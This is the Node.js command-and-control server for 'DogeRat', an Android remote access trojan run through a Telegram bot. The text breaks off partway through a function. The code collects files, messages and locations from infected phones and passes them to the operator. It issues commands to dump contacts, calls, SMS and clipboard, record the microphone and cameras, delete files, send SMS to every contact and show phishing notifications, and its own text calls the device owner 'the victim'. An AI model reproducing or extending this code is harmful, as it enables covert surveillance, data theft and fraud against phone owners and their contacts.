const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

// Load environment variables
require('dotenv').config();

// Configuration - Use environment variables or defaults
const token = process.env.TELEGRAM_BOT_TOKEN || '';
const id = process.env.TELEGRAM_CHAT_ID || '';
const address = process.env.PING_ADDRESS || 'https://www.google.com';
const PORT = process.env.PORT || 8999;

// Validate configuration
if (!token || token === 'telegram_bot_token_here') {
    console.error('ERROR: TELEGRAM_BOT_TOKEN is not configured!');
    console.error('Please set TELEGRAM_BOT_TOKEN environment variable');
}
if (!id || id === 'telegram_chatid-here') {
    console.warn('WARNING: TELEGRAM_CHAT_ID is not configured!');
    console.warn('Bot will not send messages to anyone until chat ID is set');
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    perMessageDeflate: false,
    clientTracking: true
});

let appBot = null;
try {
    appBot = new telegramBot(token, { polling: true });
    console.log('Telegram bot initialized successfully');
} catch (error) {
    console.error('Failed to initialize Telegram bot:', error.message);
}

const appClients = new Map();

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } // 50MB limit
});
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Health check endpoint
app.get('/', function (req, res) {
    res.send('<h1 align="center">DogeRat Server v1.0.0</h1><p>Status: Online</p>');
});

// Status endpoint
app.get('/status', function (req, res) {
    res.json({
        status: 'online',
        connectedDevices: appClients.size,
        uptime: process.uptime()
    });
});

// File upload endpoint
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No file uploaded');
        }
        
        const name = req.file.originalname || 'unknown_file';
        const model = req.headers.model || 'Unknown Device';
        
        if (appBot && id) {
            appBot.sendDocument(id, req.file.buffer, {
                caption: `°• 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚏𝚛𝚘𝚖 <b>${model}</b> 𝚍𝚎𝚟𝚒𝚌𝚎`,
                parse_mode: "HTML"
            }, {
                filename: name,
                contentType: 'application/octet-stream',
            }).catch(err => console.error('Error sending document:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Upload file error:', error.message);
        res.status(500).send('Error uploading file');
    }
});

// Text upload endpoint
app.post("/uploadText", (req, res) => {
    try {
        const model = req.headers.model || 'Unknown Device';
        const text = req.body['text'] || '';
        
        if (appBot && id) {
            appBot.sendMessage(id, `°• 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚏𝚛𝚘𝚖 <b>${model}</b> 𝚍𝚎𝚟𝚒𝚌𝚎\n\n` + text, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('Error sending message:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Upload text error:', error.message);
        res.status(500).send('Error uploading text');
    }
});

// Location upload endpoint
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body['lat'];
        const lon = req.body['lon'];
        const model = req.headers.model || 'Unknown Device';
        
        if (appBot && id && lat && lon) {
            appBot.sendLocation(id, lat, lon).catch(err => console.error('Error sending location:', err.message));
            appBot.sendMessage(id, `°• 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚏𝚛𝚘𝚖 <b>${model}</b> 𝚍𝚎𝚟𝚒𝚌𝚎`, { 
                parse_mode: "HTML" 
            }).catch(err => console.error('Error sending location message:', err.message));
        }
        res.send('OK');
    } catch (error) {
        console.error('Upload location error:', error.message);
        res.status(500).send('Error uploading location');
    }
});

// WebSocket connection handling
appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || 'Unknown Device';
        const battery = req.headers.battery || '0';
        const version = req.headers.version || 'Unknown';
        const brightness = req.headers.brightness || '0';
        const provider = req.headers.provider || 'Unknown';

        ws.uuid = uuid;
        ws.isAlive = true;
        
        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            connectedAt: new Date().toISOString()
        });
        
        console.log(`Device connected: ${model} (${uuid})`);
        
        if (appBot && id) {
            appBot.sendMessage(id,
                `°• 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍\n\n` +
                `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
                `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
                `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
                `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
                `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
                { parse_mode: "HTML" }
            ).catch(err => console.error('Error sending connection message:', err.message));
        }

        ws.on('pong', () => {
            ws.isAlive = true;
        });

        ws.on('close', function () {
            console.log(`Device disconnected: ${model} (${uuid})`);
            
            if (appBot && id) {
                appBot.sendMessage(id,
                    `°• 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍\n\n` +
                    `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
                    `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
                    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
                    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
                    { parse_mode: "HTML" }
                ).catch(err => console.error('Error sending disconnection message:', err.message));
            }
            appClients.delete(ws.uuid);
        });

        ws.on('error', function (error) {
            console.error(`WebSocket error for ${model}:`, error.message);
        });
        
    } catch (error) {
        console.error('Connection handling error:', error.message);
    }
});

// Heartbeat to detect disconnected clients
const heartbeatInterval = setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log(`Terminating dead connection: ${ws.uuid}`);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

appSocket.on('close', () => {
    clearInterval(heartbeatInterval);
});

// Telegram bot message handling
if (appBot) {
    appBot.on('message', (message) => {
        try {
            const chatId = message.chat.id;
            
            // Handle reply messages
            if (message.reply_to_message) {
                handleReplyMessage(message, chatId);
            }
            
            // Handle command messages
            if (id && chatId.toString() === id.toString()) {
                handleCommandMessage(message, chatId);
            } else if (message.text === '/start' || message.text?.startsWith('/')) {
                // Only allow commands from unauthorized users for /start
                if (message.text === '/start') {
                    appBot.sendMessage(chatId,
                        '°• 𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍\n\n' +
                        '• This bot is private. Contact the administrator for access.',
                        { parse_mode: "HTML" }
                    ).catch(err => console.error('Error:', err.message));
                }
            }
        } catch (error) {
            console.error('Message handling error:', error.message);
        }
    });

    appBot.on("callback_query", (callbackQuery) => {
        try {
            handleCallbackQuery(callbackQuery);
        } catch (error) {
            console.error('Callback query error:', error.message);
        }
    });

    appBot.on('error', (error) => {
        console.error('Bot error:', error.message);
    });

    appBot.on('polling_error', (error) => {
        console.error('Polling error:', error.message);
    });
}

function handleReplyMessage(message, chatId) {
    if (!id || chatId.toString() !== id.toString()) return;
    
    const replyText = message.reply_to_message?.text || '';
    
    if (replyText.includes('°• 𝙿𝚕𝚎𝚊𝚜𝚎 𝚛𝚎𝚙𝚕𝚢 𝚝𝚑𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚘 𝚠𝚑𝚒𝚌𝚑 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚑𝚎 𝚂𝙼𝚂')) {
        currentNumber = message.text;
        appBot.sendMessage(id,
            '°• 𝙶𝚛𝚎𝚊𝚝, 𝚗𝚘𝚠 𝚎𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚝𝚑𝚒𝚜 𝚗𝚞𝚖𝚋𝚎𝚛\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('Error:', err.message));
    }
    
    if (replyText.includes('°• 𝙶𝚛𝚎𝚊𝚝, 𝚗𝚘𝚠 𝚎𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚝𝚑𝚒𝚜 𝚗𝚞𝚖𝚋𝚎𝚛')) {
        sendToDevice(currentUuid, `send_message:${currentNumber}/${message.text}`);
        currentNumber = '';
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜')) {
        sendToDevice(currentUuid, `send_message_to_all:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍')) {
        sendToDevice(currentUuid, `file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚎𝚕𝚎𝚝𝚎')) {
        sendToDevice(currentUuid, `delete_file:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍')) {
        const duration = parseInt(message.text);
        if (!isNaN(duration) && duration > 0) {
            sendToDevice(currentUuid, `microphone:${duration}`);
        } else {
            appBot.sendMessage(id, '°• Invalid duration. Please enter a valid number in seconds.').catch(() => {});
        }
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚖𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍')) {
        sendToDevice(currentUuid, `rec_camera_main:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚑𝚘𝚠 𝚕𝚘𝚗𝚐 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚜𝚎𝚕𝚏𝚒𝚎 𝚌𝚊𝚖𝚎𝚛𝚊 𝚝𝚘 𝚋𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚍')) {
        sendToDevice(currentUuid, `rec_camera_selfie:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚘𝚗 𝚝𝚑𝚎 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚎𝚟𝚒𝚌𝚎')) {
        currentTitle = message.text;
        appBot.sendMessage(id,
            '°• 𝙶𝚛𝚎𝚊𝚝, 𝚗𝚘𝚠 𝚎𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚕𝚒𝚗𝚔 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚋𝚎 𝚘𝚙𝚎𝚗𝚎𝚍 𝚋𝚢 𝚝𝚑𝚎 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗\n\n' +
            '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
            { reply_markup: { force_reply: true } }
        ).catch(err => console.error('Error:', err.message));
    }
    
    if (replyText.includes('°• 𝙶𝚛𝚎𝚊𝚝, 𝚗𝚘𝚠 𝚎𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚕𝚒𝚗𝚔 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚋𝚎 𝚘𝚙𝚎𝚗𝚎𝚍 𝚋𝚢 𝚝𝚑𝚎 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗')) {
        sendToDevice(currentUuid, `show_notification:${currentTitle}/${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
    
    if (replyText.includes('°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚊𝚞𝚍𝚒𝚘 𝚕𝚒𝚗𝚔 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚙𝚕𝚊𝚢')) {
        sendToDevice(currentUuid, `play_audio:${message.text}`);
        currentUuid = '';
        sendProcessingMessage();
    }
}

function handleCommandMessage(message, chatId) {
    if (message.text === '/start') {
        appBot.sendMessage(id,
            '°• 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝚊𝚝 𝚙𝚊𝚗𝚎𝚕\n\n' +
            '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
            '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
            '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
            '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        ).catch(err => console.error('Error:', err.message));
    }
    
    if (message.text === '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• 𝙽𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚗𝚐 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎\n\n' +
                '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
            ).catch(err => console.error('Error:', err.message));
        } else {
            let text = '°• 𝙻𝚒𝚜𝚝 𝚘𝚏 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 :\n\n';
            appClients.forEach(function (value, key, map) {
                text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                    `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`;
            });
            appBot.sendMessage(id, text, { parse_mode: "HTML" }).catch(err => console.error('Error:', err.message));
        }
    }
    
    if (message.text === '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        if (appClients.size === 0) {
            appBot.sendMessage(id,
                '°• 𝙽𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚗𝚐 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎\n\n' +
                '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
            ).catch(err => console.error('Error:', err.message));
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key, map) {
                deviceListKeyboard.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(id, '°• 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚎𝚡𝚎𝚌𝚞𝚝𝚎 𝚌𝚘𝚖𝚖𝚎𝚗𝚍', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            }).catch(err => console.error('Error:', err.message));
        }
    }
}

function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (!id) return;

    const commandHandlers = {
        'device': () => {
            const deviceInfo = appClients.get(uuid);
            if (!deviceInfo) {
                appBot.sendMessage(id, '°• Device not found or disconnected').catch(() => {});
                return;
            }
            appBot.editMessageText(`°• 𝚂𝚎𝚕𝚎𝚌𝚝 𝚌𝚘𝚖𝚖𝚎𝚗𝚍 𝚏𝚘𝚛 𝚍𝚎𝚟𝚒𝚌𝚎 : <b>${deviceInfo.model}</b>`, {
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}` },
                            { text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}` },
                            { text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}` },
                            { text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}` },
                        ],
                        [
                            { text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}` },
                            { text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}` },
                            { text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}` },
                            { text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}` },
                            { text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}` },
                            { text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}` },
                            { text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}` },
                        ],
                        [
                            {
                                text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                                callback_data: `send_message_to_all:${uuid}`
                            }
                        ],
                    ]
                },
                parse_mode: "HTML"
            }).catch(err => console.error('Error:', err.message));
        },
        'calls': () => {
            sendToDevice(uuid, 'calls');
            deleteAndSendProcessing(msg.message_id);
        },
        'contacts': () => {
            sendToDevice(uuid, 'contacts');
            deleteAndSendProcessing(msg.message_id);
        },
        'messages': () => {
            sendToDevice(uuid, 'messages');
            deleteAndSendProcessing(msg.message_id);
        },
        'apps': () => {
            sendToDevice(uuid, 'apps');
            deleteAndSendProcessing(msg.message_id);
        },
        'device_info': () => {
            sendToDevice(uuid, 'device_info');
            deleteAndSendProcessing(msg.message_id);
        },
        'clipboard': () => {
            sendToDevice(uuid, 'clipboard');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_main': () => {
            sendToDevice(uuid, 'camera_main');
            deleteAndSendProcessing(msg.message_id);
        },
        'camera_selfie': () => {
            sendToDevice(uuid, 'camera_selfie');
            deleteAndSendProcessing(msg.message_id);
        },
        'location': () => {
            sendToDevice(uuid, 'location');
            deleteAndSendProcessing(msg.message_id);
        },
        'vibrate': () => {
            sendToDevice(uuid, 'vibrate');
            deleteAndSendProcessing(msg.message_id);
        },
        'stop_audio': () => {
            sendToDevice(uuid, 'stop_audio');
            deleteAndSendProcessing(msg.message_id);
        },
        'send_message': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id, '°• 𝙿𝚕𝚎𝚊𝚜𝚎 𝚛𝚎𝚙𝚕𝚢 𝚝𝚑𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚘 𝚠𝚑𝚒𝚌𝚑 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚑𝚎 𝚂𝙼𝚂\n\n' +
                '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'send_message_to_all': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                { reply_markup: { force_reply: true } }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
                '°• 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚙𝚊𝚝𝚑 𝚘𝚏 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍\n\n' +
                '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
                { reply_markup: { force_reply: true }, parse_mode: "HTML" }
            ).catch(err => console.error('Error:', err.message));
            currentUuid = uuid;
        },
        'delete_file': () => {
            appBot.deleteMessage(id, msg.message_id).catch(() => {});
            appBot.sendMessage(id,
